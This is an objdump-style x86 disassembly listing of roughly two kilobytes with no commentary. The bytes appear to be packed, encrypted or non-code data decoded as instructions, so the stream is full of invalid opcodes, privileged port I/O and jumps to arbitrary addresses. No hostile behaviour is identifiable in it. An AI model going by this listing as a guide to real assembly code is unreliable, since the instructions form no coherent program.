  408264:	mov    ecx,0x9c6d2f7a
  408269:	xor    ebx,DWORD PTR [eax]
  40826b:	adc    BYTE PTR ds:0x2340f4fb,0xd5
  408272:	dec    ebx
  408273:	outs   dx,BYTE PTR ds:[esi]
  408274:	xchg   DWORD PTR [esi],edi
  408276:	not    DWORD PTR [eax]
  408278:	sub    eax,0xf6736de6
  40827d:	aad    0x6b
  40827f:	or     al,0xfa
  408281:	rcr    BYTE PTR [ebx+0x2b96da06],cl
  408287:	(bad)  
  408288:	in     eax,dx
  408289:	sub    eax,0xa5bae1a
  40828e:	push   eax
  40828f:	pop    ecx
  408290:	fnstenvw [edx+0x79c19a00]
  408297:	add    BYTE PTR [eax-0x79],ah
  40829a:	add    eax,0xacacb6f5
  40829f:	xchg   DWORD PTR [eax+eiz*4],ebp
  4082a2:	jae    0x40830e
  4082a4:	pop    esi
  4082a5:	test   al,0x3d
  4082a7:	jmp    0x4c28:0x1fda8a31
  4082ae:	shl    DWORD PTR [ecx+0x18],cl
  4082b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082b2:	lds    esp,FWORD PTR [ebp-0x79]
  4082b5:	adc    eax,0xa15fa517
  4082ba:	(bad)  
  4082bb:	mov    eax,?
  4082bd:	cs out dx,eax
  4082bf:	or     ebx,DWORD PTR [edi]
  4082c1:	push   ebx
  4082c2:	lds    esi,FWORD PTR ds:0x3fef1130
  4082c8:	out    dx,eax
  4082c9:	dec    ecx
  4082ca:	xchg   esp,eax
  4082cb:	mov    edi,0xa268e16a
  4082d0:	(bad)  
  4082d1:	dec    esi
  4082d2:	repnz add eax,0xd14fbc34
  4082d8:	lods   al,BYTE PTR ds:[esi]
  4082d9:	mov    ds:0x24603809,eax
  4082de:	les    ecx,FWORD PTR [edx]
  4082e0:	mov    eax,0xcc991885
  4082e5:	jmp    0xd8482a49
  4082ea:	add    bh,cl
  4082ec:	mov    dh,cl
  4082ee:	mov    ds:0x2eb698d1,al
  4082f3:	jnp    0x4082d0
  4082f5:	mov    edx,0xaa797cb9
  4082fa:	fprem  
  4082fc:	adc    eax,0x6404be8a
  408301:	push   0xffffff93
  408303:	cli    
  408304:	or     eax,DWORD PTR [ecx+0x4b]
  408307:	dec    edx
  408308:	xchg   edx,eax
  408309:	je     0x40832a
  40830b:	fdivr  QWORD PTR [ecx+ebx*1]
  40830e:	sbb    al,0xb1
  408310:	test   al,0x29
  408312:	or     BYTE PTR [esi-0x7df72814],dh
  408318:	loop   0x408375
  40831a:	jae    0x4082d8
  40831c:	sbb    DWORD PTR [ebx+0x4ebe0d56],ebx
  408322:	and    ebx,DWORD PTR [esi]
  408324:	(bad)  
  408325:	xchg   edx,eax
  408326:	jmp    0xe2363e22
  40832b:	ret    
  40832c:	cmp    BYTE PTR [ebx-0x7f2a34b8],al
  408332:	sbb    eax,0x7db57412
  408337:	push   es
  408338:	out    dx,al
  408339:	cmp    edx,esp
  40833b:	test   ah,ch
  40833d:	xchg   ebx,eax
  40833e:	addr16 jmp 0x40832c
  408341:	dec    edx
  408342:	les    ecx,FWORD PTR [ecx-0x2b546b00]
  408348:	xchg   esp,eax
  408349:	mov    edi,0xcda14b3
  40834e:	adc    al,BYTE PTR [ebx-0x3baa7262]
  408354:	adc    ecx,DWORD PTR [eax+0x6f0d53bf]
  40835a:	pusha  
  40835b:	mov    al,ds:0x52db62ba
  408360:	dec    esi
  408361:	push   eax
  408362:	push   ebx
  408363:	loop   0x408352
  408365:	fs xchg ebp,eax
  408367:	test   DWORD PTR [ecx],edx
  408369:	std    
  40836a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40836b:	out    0x7b,eax
  40836d:	jmp    0x40838b
  40836f:	jne    0x4082f9
  408371:	pop    ds
  408372:	and    ah,BYTE PTR [edi]
  408374:	pop    esi
  408375:	sub    al,0xa4
  408377:	in     al,dx
  408378:	dec    ebx
  408379:	sbb    al,BYTE PTR [ebp+0x54]
  40837c:	xchg   edi,eax
  40837d:	xor    al,0x6
  40837f:	pop    ecx
  408380:	ret    
  408381:	fadd   st(4),st
  408383:	fcmovne st,st(2)
  408385:	xchg   ebp,eax
  408386:	mov    eax,ds:0x66a8331a
  40838b:	mov    cl,BYTE PTR [edi-0x2c34d259]
  408391:	clc    
  408392:	fimul  DWORD PTR [esi+0x51]
  408395:	(bad)  
  408396:	mov    ebp,0xe244d4aa
  40839b:	or     al,0xb0
  40839d:	rol    DWORD PTR [eax],0xc4
  4083a0:	jmp    0x408331
  4083a2:	jbe    0x408364
  4083a4:	mov    WORD PTR [edi+eiz*1-0x5c],fs
  4083a8:	jo     0x408402
  4083aa:	push   edi
  4083ab:	mov    bl,0xe6
  4083ad:	push   es
  4083ae:	mov    ebp,0x616efe72
  4083b3:	jne    0x4083dd
  4083b5:	or     ah,BYTE PTR [ecx+ebp*8-0x32]
  4083b9:	jge    0x4083b4
  4083bb:	inc    eax
  4083bc:	inc    edx
  4083bd:	repz xchg dh,ah
  4083c0:	cmp    DWORD PTR [edi+0x41],ebx
  4083c3:	push   esi
  4083c4:	add    edx,DWORD PTR [edx-0x506edcc9]
  4083ca:	push   cs
  4083cb:	ins    BYTE PTR es:[edi],dx
  4083cc:	test   al,0xd6
  4083ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083cf:	or     eax,0x88c5c593
  4083d4:	push   0x1813fd97
  4083d9:	jecxz  0x4083d6
  4083db:	cmp    al,ah
  4083dd:	sub    al,0xfa
  4083df:	mov    bl,0x2d
  4083e1:	inc    eax
  4083e2:	mov    ebp,0xc5b7cdee
  4083e7:	inc    ebx
  4083e8:	jmp    0x40844f
  4083ea:	push   esp
  4083eb:	outs   dx,BYTE PTR es:[esi]
  4083ed:	cmp    eax,0x106b9577
  4083f2:	or     DWORD PTR [edx-0x60],edi
  4083f5:	cmp    ebp,edi
  4083f7:	in     al,0xbf
  4083f9:	ins    BYTE PTR es:[edi],dx
  4083fa:	ficomp WORD PTR [esi-0x2]
  4083fd:	sub    ah,bh
  4083ff:	dec    eax
  408400:	dec    esi
  408401:	retf   0x61c4
  408404:	jecxz  0x408400
  408406:	dec    ebx
  408407:	lock call 0x259f025b
  40840d:	cdq    
  40840e:	jb     0x40848d
  408410:	fbstp  TBYTE PTR [edi+ecx*2]
  408413:	inc    esi
  408414:	loope  0x4083d0
  408416:	and    ebp,DWORD PTR [edx+0x42787531]
  40841c:	push   esi
  40841d:	adc    ebp,DWORD PTR [esi-0x5b4a68d2]
  408423:	out    0xdf,eax
  408425:	loopne 0x408477
  408427:	addr16 pop edi
  408429:	add    DWORD PTR [esi+0x1e67e53e],eax
  40842f:	dec    edi
  408430:	hlt    
  408431:	loopne 0x40842b
  408433:	pop    ebp
  408434:	push   ecx
  408435:	mov    ebx,0xd785feea
  40843a:	mov    esi,0x5dfb6d8e
  40843f:	mov    edx,0x42ed9b2e
  408444:	in     eax,dx
  408445:	cwde   
  408446:	mov    ds:0xb56dd981,eax
  40844b:	dec    eax
  40844c:	xor    ebp,DWORD PTR [edi-0x79]
  40844f:	jb     0x4084a4
  408451:	repnz ds (bad) 
  408455:	neg    ah
  408457:	fldenv [ecx-0x2dd0ae2e]
  40845d:	cli    
  40845e:	outs   dx,BYTE PTR ds:[esi]
  40845f:	inc    edx
  408460:	mov    eax,0x3ec5c859
  408465:	mov    esp,0xb906a439
  40846a:	jg     0x408489
  40846c:	mov    ebp,0x381fa529
  408471:	xor    esi,DWORD PTR [ebp-0x1c]
  408474:	shl    esi,0xf2
  408477:	or     eax,0x128ef547
  40847c:	cmp    eax,0x25706c03
  408481:	inc    ebp
  408482:	dec    ecx
  408483:	scas   eax,DWORD PTR es:[edi]
  408484:	xlat   BYTE PTR ds:[ebx]
  408485:	mov    eax,ds:0x8bba1861
  40848a:	(bad)  
  40848b:	jb     0x40842b
  40848d:	jmp    0x5de50848
  408492:	fcmovne st,st(6)
  408494:	sub    DWORD PTR [edx-0x16],edx
  408497:	fistp  WORD PTR [esi]
  408499:	cmc    
  40849a:	mov    edi,0x300bf7ad
  40849f:	or     eax,0xaccab2cf
  4084a4:	add    DWORD PTR [eax-0x6407f04],0x538af8b
  4084ae:	out    0x98,eax
  4084b0:	pop    ebp
  4084b1:	ret    0x1e16
  4084b4:	xchg   edi,eax
  4084b5:	xchg   edx,eax
  4084b6:	in     eax,dx
  4084b7:	ret    0xfbc2
  4084ba:	mov    esi,0x2e11aeb4
  4084bf:	and    al,0xfd
  4084c1:	sbb    al,0xd
  4084c3:	or     bl,cl
  4084c5:	push   edi
  4084c6:	inc    eax
  4084c7:	dec    ecx
  4084c8:	jbe    0x408496
  4084ca:	dec    edx
  4084cb:	rol    BYTE PTR [ecx-0x731cd489],0xe
  4084d2:	or     eax,0x660e9070
  4084d7:	jl     0x40853f
  4084d9:	mov    bl,0xaa
  4084db:	out    dx,al
  4084dc:	ins    DWORD PTR es:[edi],dx
  4084dd:	mov    bl,0xed
  4084df:	test   BYTE PTR [ecx+0x5e39330a],cl
  4084e5:	sub    edi,ebx
  4084e7:	push   ebp
  4084e8:	mov    bh,0x3
  4084ea:	push   eax
  4084eb:	jmp    0x404cf7a0
  4084f0:	mov    ebx,DWORD PTR [edx-0x78]
  4084f3:	xor    edx,esi
  4084f5:	mov    esp,0x967ccbbe
  4084fa:	mov    ebp,0x8bd9be73
  4084ff:	imul   eax,ecx,0xfb9db897
  408505:	outs   dx,DWORD PTR ds:[esi]
  408506:	add    ebp,DWORD PTR [ecx+0x6e]
  408509:	jno    0x408514
  40850b:	fidiv  DWORD PTR [ebp-0x76]
  40850e:	mov    ds,dx
  408511:	icebp  
  408512:	or     BYTE PTR [esi+0x3be93a83],dh
  408518:	and    DWORD PTR [edx+ebp*1-0x55],0x49
  40851d:	int3   
  40851e:	gs push esi
  408520:	loop   0x4084e2
  408522:	fistp  QWORD PTR [esp+eax*4+0x3e]
  408526:	or     eax,0x9491197a
  40852b:	ud1    edx,DWORD PTR [edx+0x4107701d]
  408532:	shl    DWORD PTR [edx-0x18e07c18],1
  408538:	jmp    0x7aa49f2e
  40853d:	pop    ss
  40853e:	iret   
  40853f:	out    dx,eax
  408540:	lea    edx,[ecx]
  408542:	sub    al,0x63
  408544:	fcomip st,st(3)
  408546:	in     al,0xb0
  408548:	popf   
  408549:	not    dh
  40854b:	adc    eax,edx
  40854d:	or     BYTE PTR [ecx-0x1ef0103],bh
  408553:	es push ebp
  408555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408556:	mov    ebx,0x12ace14
  40855b:	jle    0x408531
  40855d:	fadd   DWORD PTR [edi+0x46]
  408560:	out    dx,eax
  408561:	mov    eax,0x87a291a1
  408566:	shl    DWORD PTR [edi-0x33],0xfb
  40856a:	leave  
  40856b:	sbb    al,0x22
  40856d:	or     esi,DWORD PTR [esi+0x795ce11a]
  408573:	pop    ds
  408574:	retf   0xd79f
  408577:	xor    eax,0x480e0a6
  40857c:	pushf  
  40857d:	ins    BYTE PTR es:[edi],dx
  40857e:	cld    
  40857f:	into   
  408580:	int    0x34
  408582:	idiv   BYTE PTR [esi-0x7f]
  408585:	adc    DWORD PTR [ecx-0x2561a1e9],esp
  40858b:	add    BYTE PTR [ecx],al
  40858d:	jmp    0x7b44352f
  408592:	push   ss
  408593:	clc    
  408594:	fwait
  408595:	(bad)  
  408596:	ror    BYTE PTR [edi],1
  408598:	loopne 0x408608
  40859a:	enter  0xd3ea,0xa1
  40859e:	jbe    0x4085a6
  4085a0:	sbb    DWORD PTR [ebp+0x43798eed],ebx
  4085a6:	pextrw ebx,(bad),0xc5
  4085a8:	popf   
  4085a9:	push   esi
  4085aa:	push   edi
  4085ab:	inc    ebp
  4085ac:	aam    0x4b
  4085ae:	mov    fs:0xcdef270,eax
  4085b4:	stc    
  4085b5:	fidivr WORD PTR [ecx+0x69]
  4085b8:	mov    eax,ds:0xf639592
  4085bd:	push   es
  4085be:	and    DWORD PTR [edx+0x62],ecx
  4085c1:	mov    al,0x6d
  4085c3:	enter  0xf744,0x21
  4085c7:	sbb    al,0x9
  4085c9:	dec    eax
  4085ca:	out    0x87,eax
  4085cc:	mov    DWORD PTR ds:0x2b23b671,esp
  4085d2:	clc    
  4085d3:	adc    ebx,DWORD PTR [ecx+0x19aa7b5d]
  4085d9:	add    al,0x99
  4085db:	inc    edx
  4085dc:	mov    esp,0xb8364a58
  4085e1:	sub    eax,0x8e359ac0
  4085e6:	call   0x31d:0xacddaba7
  4085ed:	cdq    
  4085ee:	(bad)  
  4085ef:	leave  
  4085f0:	bound  ecx,QWORD PTR [ebx-0x3c46db70]
  4085f6:	ja     0x4085b9
  4085f8:	pop    ds
  4085f9:	ss nop
  4085fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085fc:	jg     0x408652
  4085fe:	(bad)  
  408600:	rcl    BYTE PTR [eax+eiz*4],1
  408603:	dec    esi
  408604:	loope  0x4085e0
  408606:	into   
  408607:	pop    esi
  408608:	xchg   ebx,eax
  408609:	lods   eax,DWORD PTR ds:[esi]
  40860a:	cmp    ecx,DWORD PTR [ebx]
  40860c:	test   eax,0x29a209cf
  408611:	daa    
  408612:	aas    
  408613:	lods   eax,DWORD PTR ds:[esi]
  408614:	inc    esi
  408615:	xchg   esi,eax
  408616:	xor    ecx,DWORD PTR [ebp-0xe]
  408619:	push   esp
  40861a:	lods   al,BYTE PTR ds:[esi]
  40861b:	mov    edx,0xc521506
  408620:	into   
  408621:	push   ss
  408622:	push   ss
  408623:	push   es
  408624:	enter  0xfdcb,0xda
  408628:	xchg   edx,eax
  408629:	addr16 mov al,ds:0x7e41
  40862d:	cs xchg edx,eax
  40862f:	xor    ebx,DWORD PTR [ebp-0xf]
  408632:	adc    BYTE PTR [ebp-0x70],dh
  408635:	push   esi
  408636:	cwde   
  408637:	jno    0x408666
  408639:	jl     0x408616
  40863b:	sub    DWORD PTR [ecx-0x57],esi
  40863e:	icebp  
  40863f:	lods   eax,DWORD PTR ds:[esi]
  408640:	repnz mov bh,0x7e
  408643:	or     BYTE PTR [ecx+ebx*1],bl
  408646:	fist   DWORD PTR [edx+0x2c8781aa]
  40864c:	jecxz  0x40864b
  40864e:	or     edx,DWORD PTR [eax-0x1269fbfc]
  408654:	jbe    0x4085fd
  408656:	out    0x1,eax
  408658:	lods   eax,DWORD PTR ds:[esi]
  408659:	jno    0x408648
  40865b:	inc    edi
  40865c:	int3   
  40865d:	mov    ch,0x49
  40865f:	cdq    
  408660:	push   0x6e980aa3
  408665:	das    
  408666:	pop    ebp
  408667:	inc    esp
  408668:	inc    edx
  408669:	xchg   ecx,eax
  40866a:	push   ebx
  40866b:	enter  0xb52d,0xde
  40866f:	shr    DWORD PTR [edi-0x580fd609],cl
  408675:	cwde   
  408676:	arpl   WORD PTR [esi-0x49],bx
  408679:	lahf   
  40867a:	addr16 jge 0x4086cd
  40867d:	(bad)  
  40867e:	sub    ecx,edx
  408680:	sub    eax,0x94e7ffff
  408685:	inc    ecx
  408686:	mov    esp,0x393b1af9
  40868b:	pushf  
  40868c:	jno    0x408709
  40868e:	into   
  40868f:	out    0x40,al
  408691:	jg     0x408650
  408693:	mov    ds:0x71d6f95c,eax
  408698:	ss loop 0x408673
  40869b:	inc    esi
  40869c:	ret    0xbf1
  40869f:	adc    al,0x76
  4086a1:	loopne 0x4086b6
  4086a3:	cdq    
  4086a4:	ja     0x408714
  4086a6:	jecxz  0x4086a6
  4086a8:	and    DWORD PTR [edx],edi
  4086aa:	mov    bl,0xac
  4086ac:	sub    bh,cl
  4086ae:	push   es
  4086af:	(bad)  
  4086b0:	xor    al,BYTE PTR [esi-0x346472d3]
  4086b6:	and    eax,0xdbf6d406
  4086bb:	sub    eax,0x847479f5
  4086c0:	scas   eax,DWORD PTR es:[edi]
  4086c1:	adc    al,BYTE PTR [edx-0x373a4211]
  4086c7:	mov    edi,0xb4de839f
  4086cc:	xchg   edx,eax
  4086cd:	ret    
  4086ce:	jae    0x40870d
  4086d0:	xor    edx,DWORD PTR [ebp+ebx*4-0x254ce9d0]
  4086d7:	push   esp
  4086d8:	push   0xffffffe1
  4086da:	add    al,0x74
  4086dc:	add    esp,DWORD PTR [edi+0x2707702f]
  4086e2:	(bad)  
  4086e3:	dec    ebx
  4086e4:	mov    edi,0x112d7459
  4086e9:	neg    DWORD PTR [eax]
  4086eb:	cmp    al,bl
  4086ed:	xchg   ebp,eax
  4086ee:	out    0xb1,eax
  4086f0:	ds stc 
  4086f2:	test   al,0xd3
  4086f4:	mov    ebx,DWORD PTR [ecx]
  4086f6:	dec    edi
  4086f7:	repnz shr DWORD PTR [eax+0x210abeb8],1
  4086fe:	fwait
  4086ff:	lds    edi,FWORD PTR [ebp-0x5942096f]
  408705:	and    DWORD PTR [edx],ebp
  408707:	sbb    bh,BYTE PTR [ebx+eiz*1]
  40870a:	repnz les esp,FWORD PTR [ebp+0xb0ea549]
  408711:	xchg   ebx,eax
  408712:	std    
  408713:	ret    0x1e2e
  408716:	in     eax,dx
  408717:	mov    eax,0x87c2f636
  40871c:	ins    DWORD PTR es:[edi],dx
  40871d:	xor    BYTE PTR [ebp+0x71],ah
  408720:	pop    ecx
  408721:	cwde   
  408722:	shl    cl,0x72
  408725:	mov    edi,0x7e6ca74b
  40872a:	jge    0x40879b
  40872c:	ja     0x408705
  40872e:	sbb    BYTE PTR [edx+0x43cca9c0],ah
  408734:	jle    0x4086ff
  408736:	xor    BYTE PTR [ebx+0x5870537b],dh
  40873c:	out    0x99,al
  40873e:	(bad)  
  40873f:	cmc    
  408740:	push   0xfffffffe
  408742:	mov    ebx,gs
  408744:	outs   dx,DWORD PTR ds:[esi]
  408745:	out    dx,eax
  408746:	icebp  
  408747:	sbb    DWORD PTR [ebp+0x76],edi
  40874a:	sub    eax,0x38c91706
  40874f:	sbb    al,0xc0
  408751:	cmp    ebx,DWORD PTR [ebx]
  408753:	add    eax,0x676447e0
  408758:	leave  
  408759:	fidivr WORD PTR ds:0x5610ea63
  40875f:	sub    eax,0x68253f53
  408764:	or     al,0xf2
  408766:	jmp    0xa47b61fe
  40876b:	sub    esi,DWORD PTR [ebp+0x37]
  40876e:	dec    eax
  40876f:	mov    edi,0x3c9cd6b6
  408774:	jbe    0x4087aa
  408776:	ss call 0xb0e4:0x447c46ab
  40877e:	js     0x40879c
  408780:	je     0x4087f8
  408782:	push   ds
  408783:	fnstsw WORD PTR [esp+ebx*2-0x5b46706e]
  40878a:	(bad)  
  40878c:	push   es
  40878d:	xchg   edx,eax
  40878e:	dec    eax
  40878f:	aaa    
  408790:	xchg   edx,eax
  408791:	inc    esi
  408792:	push   ebp
  408793:	shr    BYTE PTR [edx-0x6c8ab6f4],0xdb
  40879a:	scas   al,BYTE PTR es:[edi]
  40879b:	jle    0x408753
  40879d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40879e:	in     eax,0x58
  4087a0:	(bad)
  4087a3:	or     eax,0x87e004cf
  4087a8:	dec    ecx
  4087a9:	inc    ebp
  4087aa:	inc    eax
  4087ab:	or     eax,0xdf46d206
  4087b0:	rcl    DWORD PTR [ecx+0x6],0x32
  4087b4:	lock iret 
  4087b6:	or     cl,BYTE PTR [ecx-0x2d]
  4087b9:	lods   al,BYTE PTR ds:[esi]
  4087ba:	inc    ebp
  4087bb:	push   edx
  4087bc:	mov    al,0x36
  4087be:	stc    
  4087bf:	(bad)  
  4087c0:	pop    edi
  4087c1:	mov    esp,0x4e2e7217
  4087c6:	shr    BYTE PTR [eax],1
  4087c8:	add    edx,DWORD PTR [eax+0x56]
  4087cb:	fisttp WORD PTR [ebx+eiz*2+0x4c]
  4087cf:	out    0x9d,eax
  4087d1:	test   al,0xcf
  4087d3:	stos   BYTE PTR es:[edi],al
  4087d4:	sbb    cl,cl
  4087d6:	mov    edx,0x59578609
  4087db:	addr16 push 0xfffffff3
  4087de:	jns    0x408800
  4087e0:	xor    BYTE PTR [edx-0x20],bl
  4087e3:	sub    BYTE PTR [edi],dh
  4087e5:	call   0x5bff:0xbb2b84fc
  4087ec:	imul   ebx,ecx,0xffffffdd
  4087ef:	mov    esp,0x9ae126ff
  4087f4:	leave  
  4087f5:	xor    al,BYTE PTR [eax+0x73]
  4087f8:	cli    
  4087f9:	int3   
  4087fa:	add    BYTE PTR [ebx+0x2ac4a8b2],cl
  408800:	push   edi
  408801:	or     al,0x2e
  408803:	cli    
  408804:	cli    
  408805:	out    0x6c,eax
  408807:	dec    esi
  408808:	xchg   ebp,eax
  408809:	fcmovnu st,st(3)
  40880b:	mov    eax,ds:0x828e80cf
  408810:	outs   dx,DWORD PTR ds:[esi]
  408811:	shufps xmm2,XMMWORD PTR [eax+0x4f71e4ac],0x5c
  408819:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40881a:	test   DWORD PTR [edx+esi*8-0x2715b87f],edi
  408821:	jno    0x408852
  408823:	in     eax,0x10
  408825:	add    dl,BYTE PTR [ebp+0x15]
  408828:	add    al,0xef
  40882a:	dec    ebx
  40882b:	fisubr DWORD PTR [ebp+0x43]
  40882e:	mov    ah,0xe2
  408830:	mov    eax,ds:0x1071bbf0
  408835:	push   0x2b
  408837:	pushf  
  408838:	(bad)  [esi+0x6d]
  40883b:	sbb    BYTE PTR [esi],ch
  40883d:	mov    esp,0x654595db
  408842:	sahf   
  408843:	leave  
  408844:	and    BYTE PTR [edx+0x46],0x75
  408848:	push   0x61fe8b25
  40884d:	cld    
  40884e:	jecxz  0x4088c3
  408850:	leave  
  408851:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408852:	or     al,0x0
  408854:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408855:	push   ds
  408856:	push   eax
  408857:	inc    ecx
  408858:	rcr    BYTE PTR [ebx+0x2843200],cl
  40885e:	push   ebp
  40885f:	pop    ebp
  408860:	or     eax,0xbdbc8487
  408865:	pop    esi
  408866:	and    BYTE PTR [esi],ah
  408868:	mov    ebp,0x6607cb25
  40886d:	or     edi,edx
  40886f:	pop    edx
  408870:	mov    esp,0xe428426f
  408875:	dec    edx
  408876:	cmp    al,0x6
  408878:	mov    bl,0x86
  40887a:	dec    ecx
  40887b:	xchg   ebx,eax
  40887c:	dec    esp
  40887d:	fistp  WORD PTR fs:[edx+0x75]
  408881:	pushw  es
  408883:	lods   al,BYTE PTR ds:[esi]
  408884:	mov    ecx,0x2d90b46d
  408889:	retf   0x4469
  40888c:	cmp    dh,cl
  40888e:	xchg   edx,eax
  40888f:	xor    esi,edx
  408891:	jno    0x408898
  408893:	sbb    al,BYTE PTR [edx]
  408895:	sub    DWORD PTR [eax-0x4e],ecx
  408898:	sub    DWORD PTR cs:0xde95acf,ebp
  40889f:	sbb    dl,BYTE PTR [ecx-0x143ede24]
  4088a5:	cdq    
  4088a6:	push   0x57
  4088a8:	or     eax,0x8cf29d5
  4088ad:	jmp    0x59683042
  4088b2:	clc    
  4088b3:	jne    0x4088cf
  4088b5:	not    BYTE PTR [edi+0x6e]
  4088b8:	enter  0x3e01,0xb1
  4088bc:	mov    dh,0xbf
  4088be:	(bad)  
  4088bf:	stos   DWORD PTR es:[edi],eax
  4088c0:	mov    DWORD PTR [ebx+0x52],ebp
  4088c3:	icebp  
  4088c4:	push   esp
  4088c5:	xor    al,0x65
  4088c7:	addr16 sahf 
  4088c9:	jne    0x40884d
  4088cb:	(bad)  
  4088cc:	jmp    0x3756:0x1de24805
  4088d3:	gs push edi
  4088d5:	ds or  dh,cl
  4088d8:	mov    esp,0xeae2bfe
  4088dd:	jns    0x408920
  4088df:	adc    BYTE PTR [ecx],dh
  4088e1:	and    eax,0xa312d2db
  4088e6:	sbb    al,0x1f
  4088e8:	xor    ch,BYTE PTR [edx+0x5d5e2f0a]
  4088ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088ef:	jg     0x40887e
  4088f1:	xor    ah,BYTE PTR [esp+esi*1+0x6313a231]
  4088f8:	es ret 0x800c
  4088fc:	jl     0x40893e
  4088fe:	jae    0x40897f
  408900:	mov    bl,0x6a
  408902:	icebp  
  408903:	jno    0x40890c
  408905:	jno    0x40896b
  408907:	ret    
  408908:	jl     0x4088a3
  40890a:	sbb    dl,BYTE PTR [eax-0x2a4a9d99]
  408910:	push   eax
  408911:	aam    0xfc
  408913:	neg    DWORD PTR [edx+0x3a]
  408916:	mov    eax,ds:0x3cdb4690
  40891b:	call   0xa91b:0xd5b4b1c
  408922:	sub    ecx,DWORD PTR [ecx-0x1d18c0c]
  408928:	fcomip st,st(5)
  40892a:	ss adc al,0x33
  40892d:	shl    DWORD PTR [eax-0x53c96969],0x9e
  408934:	inc    esi
  408935:	ror    DWORD PTR [edi],0xba
  408938:	inc    ebx
  408939:	fld    TBYTE PTR [edx-0x10]
  40893c:	(bad)  
  40893d:	jmp    0x408944
  40893f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408940:	ja     0x408997
  408942:	rcl    BYTE PTR ds:0x4d08a6ee,cl
  408948:	ficomp DWORD PTR [esi+0x5be8ef33]
  40894e:	jg     0x40896a
  408950:	xor    al,0x48
  408952:	lock fwait
  408954:	test   BYTE PTR [ebx+edx*4+0x66],ch
  408958:	jmp    0xd2878201
  40895d:	ffree  st(3)
  40895f:	xor    edx,DWORD PTR [edi+esi*8-0x53c1abe9]
  408966:	pop    ebx
  408967:	mov    dh,0xe8
  408969:	into   
  40896a:	cmp    ebx,DWORD PTR [edx+esi*1+0x2db70ef3]
  408971:	jle    0x408987
  408973:	jnp    0x4089a1
  408975:	mov    ?,WORD PTR ds:0xce28d37b
  40897b:	inc    edi
  40897c:	shr    BYTE PTR [esi+0x5ffb017e],0xd9
  408983:	cmp    bl,BYTE PTR [esi]
  408985:	adc    DWORD PTR [ebx-0x4c3b15b9],edx
  40898b:	call   0xedf18cf4
  408990:	es dec edx
  408992:	popf   
  408993:	shld   DWORD PTR ds:0xfbe9ca9d,eax,cl
  40899a:	mov    al,ds:0x519665a9
  40899f:	push   esp
  4089a0:	mov    esi,es
  4089a2:	inc    edi
  4089a3:	xchg   esi,eax
  4089a4:	aas    
  4089a5:	and    DWORD PTR [edi+0x38412b83],0xffffff81
  4089ac:	dec    edx
  4089ad:	pop    edi
  4089ae:	imul   ebx,DWORD PTR [ebx-0x11],0x98aa6c0d
  4089b5:	popf   
  4089b6:	jbe    0x408972
  4089b8:	xor    DWORD PTR [edx+ebp*1],ebx
  4089bb:	ins    DWORD PTR es:[edi],dx
  4089bc:	lahf   
  4089bd:	mov    eax,0x4d07e7a9
  4089c2:	push   ebx
  4089c3:	imul   eax
  4089c5:	je     0x408972
  4089c7:	cmp    esi,DWORD PTR [edi-0x58]
  4089ca:	cdq    
  4089cb:	sbb    eax,0x41a1ee6
  4089d0:	xchg   BYTE PTR [ebp-0x23],dl
  4089d3:	lods   eax,DWORD PTR ds:[esi]
  4089d4:	(bad)  
  4089d5:	pop    esi
  4089d6:	add    al,0xa0
  4089d8:	out    dx,eax
  4089d9:	xchg   ebx,eax
  4089da:	add    eax,0xa893c3f5
  4089df:	mov    edi,0xcf6b7fb3
  4089e4:	fst    DWORD PTR [edx+0x3e]
  4089e7:	call   FWORD PTR [ecx]
  4089e9:	js     0x74a90ae6
  4089ef:	push   ebp
  4089f0:	ficomp WORD PTR [ebx]
  4089f2:	shl    BYTE PTR [ebx+0x3b],cl
  4089f5:	ror    DWORD PTR [ecx],1
  4089f7:	mov    edi,0x63b76231
  4089fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089fd:	adc    DWORD PTR [eax+0x431b3e10],ebp
  408a03:	xchg   ebp,eax
  408a04:	daa    
  408a05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a06:	loop   0x408a41
  408a08:	sbb    eax,0xc2478483
  408a0d:	scas   al,BYTE PTR es:[edi]
  408a0e:	sub    DWORD PTR cs:[ebp-0xe],edx
  408a12:	(bad)  
  408a13:	push   esi
  408a14:	ins    DWORD PTR es:[edi],dx
  408a15:	lods   eax,DWORD PTR ds:[esi]
  408a16:	outs   dx,DWORD PTR ds:[esi]
  408a17:	sbb    BYTE PTR [edx],ch
  408a19:	mov    eax,ds:0x7bae8a9e
  408a1e:	das    
  408a1f:	dec    edx
  408a20:	push   esi
  408a21:	fldenv [ebx+0x513acb98]
  408a27:	xchg   ecx,eax
  408a28:	jge    0x4089aa
  408a2a:	mov    al,0xe2
  408a2c:	popa   
  408a2d:	push   0x6a97cffc
  408a32:	dec    esi
  408a33:	stos   BYTE PTR es:[edi],al
  408a34:	fdivr  st,st(1)
  408a36:	sbb    eax,0x157a049c
  408a3b:	xlat   BYTE PTR ds:[ebx]
  408a3c:	in     al,dx
  408a3d:	sbb    al,0xb4
  408a3f:	shl    BYTE PTR [edi-0x37e34ac0],cl
  408a45:	stos   DWORD PTR es:[di],eax
  408a47:	xor    eax,0x662a7d6c
  408a4c:	sbb    edi,esp
  408a4e:	and    bl,al
  408a50:	xchg   cl,bl
  408a52:	outs   dx,DWORD PTR ds:[esi]
  408a53:	mov    ebx,0x2ecb93f3
  408a58:	dec    esi
  408a59:	test   DWORD PTR [edi],0x5c73804c
  408a5f:	fucomip st,st(3)
  408a61:	outs   dx,DWORD PTR ds:[esi]
  408a62:	jbe    0x408a54
  408a64:	pop    eax
  408a65:	and    BYTE PTR gs:[edx+0x76],bh
  408a69:	loop   0x408a31
  408a6b:	jnp    0x408a6d
  408a6d:	inc    esi
  408a6e:	or     edx,edx
  408a70:	jns    0x408a62
  408a72:	retf   
  408a73:	nop
  408a74:	mov    al,BYTE PTR [edx+edi*4+0x73]
  408a78:	push   esi
  408a79:	aad    0x8d
  408a7b:	jle    0x408a8e
